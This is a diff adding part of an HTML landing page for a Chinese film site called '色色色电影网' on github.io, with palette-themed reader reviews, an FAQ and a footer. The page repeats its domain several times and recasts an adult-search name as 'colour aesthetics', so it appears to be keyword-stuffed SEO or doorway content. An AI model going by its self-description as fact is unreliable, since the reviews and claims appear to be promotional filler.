+      <article class="rev"><div class="cap">AMBER · 琥珀黄</div><h4>旧片重看，像翻到一封信</h4><p>修复版那层暖黄，把记忆都洗回来了。感谢这里还在认真写老片的颜色。</p><div class="who"><span class="av" style="background:var(--amber);color:#2a1c00">阿</span>阿May · 上海</div></article>
+      <article class="rev"><div class="cap">LIME · 高饱和绿</div><h4>看完想立刻出门，去任何地方</h4><p>高饱和绿太有传染性了。周末照着片单看了三部，状态被拉回来不少。</p><div class="who"><span class="av" style="background:var(--lime);color:#1a2e00">K</span>Kevin · 成都</div></article>
+      <article class="rev"><div class="cap">MONO · 极简灰</div><h4>黑白让我重新听清了台词</h4><p>没有颜色抢注意力，才发现那部文艺片的对话写得这么好。</p><div class="who"><span class="av" style="background:#cbd5e1;color:#111">鱼</span>鱼叔 · 南京</div></article>
+      <article class="rev"><div class="cap">ROSE · 褪色红</div><h4>那种红，不是热烈，是惆怅</h4><p>第一次知道颜色也有情绪。褪色红三个字，替我说清了为什么哭。</p><div class="who"><span class="av" style="background:var(--rose);color:#2a0710">周</span>周舟 · 武汉</div></article>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq" style="padding-top:74px">
+  <div class="wrap">
+    <div class="tag-l">▎FAQ · 常见问答</div>
+    <h2 class="h2">你可能<em>想问的</em><b>几个问题</b></h2>
+    <div class="rule"><i class="r"></i><i class="r"></i><i class="r"></i></div>
+    <div class="faq">
+      <details open><summary>色色色电影网主要做什么内容？</summary><div class="ans">我们是一个把「看电影」转成「看色彩」的影像内容站，聚焦色彩美学、色调分析、视觉系电影与配色指南，帮影迷按氛围与视觉风格挑片。网站地址是 https://sesesedianyingwang-zh.github.io 。</div></details>
+      <details><summary>为什么要用颜色来分类电影？</summary><div class="ans">因为色调是最直接的第一印象。剧情会剧透，评分会变化，但一部电影给你的颜色感受，往往最诚实，也最容易被记住。</div></details>
+      <details><summary>片单和评分多久更新一次？</summary><div class="ans">色彩图鉴每周更新，影迷榜单每两周由读者共同票选一次，专题专栏每月两篇。所有更新都会同步到本站首页。</div></details>
+      <details><summary>我是新手，从哪里开始看？</summary><div class="ans">建议从「色彩图鉴」挑一个你今晚最想要的颜色，再看对应的两三部片子。看不下去就换颜色，不需要有任何心理负担。</div></details>
+      <details><summary>可以投稿或推荐电影吗？</summary><div class="ans">欢迎。无论是想推荐一部被低估的冷门片，还是想写一篇关于某部电影色调的短评，都可以通过页脚的「联系我们」告诉我们。</div></details>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section>
+  <div class="wrap">
+    <div class="cta">
+      <div class="tag-l">▎TONIGHT · 今晚看什么颜色？</div>
+      <h3>让色调替你选，<br>而不是让算法替你选。</h3>
+      <p>色色色电影网（sesesedianyingwang-zh）每日更新色彩图鉴、影迷榜单、调色专栏与看片指南。把本站收藏进浏览器，再也不用为「今晚看什么」发愁。</p>
+      <div class="urlbox">https://<b>sesesedianyingwang-zh</b>.github.io</div><br>
+      <a class="btn" href="#palette">进入色彩图鉴 →</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div><a class="logo" href="#top"><span class="mark">色</span><b class="brand">色色<i>色</i>电影网</b></a>
+        <p>懂色彩也懂电影。色色色电影网用色调、氛围与视觉风格替你挑片，聚焦色彩美学、色调分析、视觉系电影与配色指南。</p>
+      </div>
+      <div><h5>栏目导航</h5><ul><li><a href="#palette">色彩图鉴</a></li><li><a href="#meter">影迷榜单</a></li><li><a href="#voices">调色视角</a></li><li><a href="#guide">看片指南</a></li><li><a href="#faq">常见问答</a></li></ul></div>
+      <div><h5>选片视角</h5><ul><li><a href="#">霓虹赛博</a></li><li><a href="#">胶片复古</a></li><li><a href="#">高饱和撞色</a></li><li><a href="#">极简单色</a></li><li><a href="#">导演用色</a></li></ul></div>
+      <div><h5>关于与联系</h5><ul><li><a href="#">关于本站</a></li><li><a href="#">投稿 / 合作</a></li><li><a href="#">隐私政策</a></li><li><a href="#">联系我们</a></li><li><a href="#top">↑ 返回顶部</a></li></ul></div>
+    </div>
+    <div class="ft-bot">
+      <span>© 2026 色色色电影网 sesesedianyingwang-zh · 网址 https://sesesedianyingwang-zh.github.io · 懂色彩也懂电影</span>
+      <span>SESESE / COLOR IN MOTION PICTURE</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('burger').addEventListener('click',function(){document.getElementById('menu').classList.toggle('open');});
+</script>
+</body>
+</html>
